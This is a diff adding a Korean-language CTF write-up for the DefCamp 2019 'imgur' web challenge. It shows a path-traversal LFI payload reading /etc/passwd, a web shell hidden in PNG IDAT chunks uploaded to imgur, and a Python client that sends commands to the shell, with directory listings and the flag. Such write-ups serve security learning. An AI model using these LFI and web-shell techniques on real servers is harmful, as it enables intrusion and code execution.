@@ -181,6 +181,76 @@ This is an out of the box challenge with a very "professional" and complex inter
 Target: https://imgur.dctfq19.def.camp  
 Author: Andrei  
 
+## find LFI
+문제의 홈페이지는 page라는 인자로 들어온 파일을 열어준다. 여기에서 `../../../../../etc/passwd` 해주면 해당 파일을 가져오는 것을 알 수 있다.
+
+## imgur?
+문제의 홈페이지는 imgur에 업로드된 사진만 프로필 사진으로 올릴 수 있다. 프로필에 웹쉘을 올리는 거라고 생각했지만 imgur 사이트로 필터걸려있는 부분이 우회가 안됐다. imgur는 상용 사이트였고, 나는 절대 저 사이트에 웹쉘을 올리는 방법이 풀이가 아닐 것이라 생각했다.
+
+## real hacking?
+실제로 imgur 사이트에 웹쉘을 업로드 하고 이를 문제 사이트에 업로드 해서 푸는 문제였다. 이게 아무리 imgur 사이트에 피해가 발생하지 않았다고 하더라도,,, 괜찮은걸까? 아무튼 문제는 풀고싶기 때문에 [png idat 영역에 웹쉘을 넣는 방식](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)으로 imgur 사이트에 웹쉘 이미지를 업로드했다. 업로드된 이미지의 주소를 문제 사이트에 프로필로 업로드했다. 이 웹쉘과 통신하는 코드를 짜서 마치 쉘을 이용하듯이 서버를 뒤졌다.
+```python
+import requests
+
+url = "https://imgur.dctfq19.def.camp/index.php?0=shell_exec&page=profiles/myimg.jpg"
+
+cookie = {'PHPSESSID':'mysession'}
+
+
+while True:
+    cmd = input("\n$ ")
+    if cmd == "exit":
+        break
+    res = requests.post(url, data={1:cmd})
+    data = res.text.split("c\\")[1].split("X")[0]
+    print(data)
+```
+위의 코드를 실행하여 아래와 같이 플래그를 찾았다.
+```sh
+$ ls /
+bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+
+
+$ ls /home
+dctf
+
+
+$ ls /home/dctf/
+
+
+$ ls -al /home/dctf/
+total 24
+drwxr-xr-x 1 dctf dctf 4096 Sep  7 16:30 .
+drwxr-xr-x 1 root root 4096 Sep  7 16:30 ..
+-rw-r--r-- 1 dctf dctf  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 dctf dctf 3771 Apr  4  2018 .bashrc
+-rw-r--r-- 1 dctf dctf  807 Apr  4  2018 .profile
+-rw-r--r-- 1 dctf dctf   70 Sep  6 10:54 flag_3d05c1f377122d0af8a3426cd2c9a739
+
+$ cat /home/dctf/flag*
+DCTF{762241E8981F7E4C2B134C2894747990989FB5DFF0A3AD8DB5A0CEB5D05CBD8D}
+```
+## flag
+`DCTF{762241E8981F7E4C2B134C2894747990989FB5DFF0A3AD8DB5A0CEB5D05CBD8D}`  
+[참고](https://nytr0gen.github.io/writeups/ctf/2019/09/09/defcamp-ctf-quals-2019.html#imgur-202p-web)
 
 # Downloader v1
 https://downloader-v1.dctfq19.def.camp  
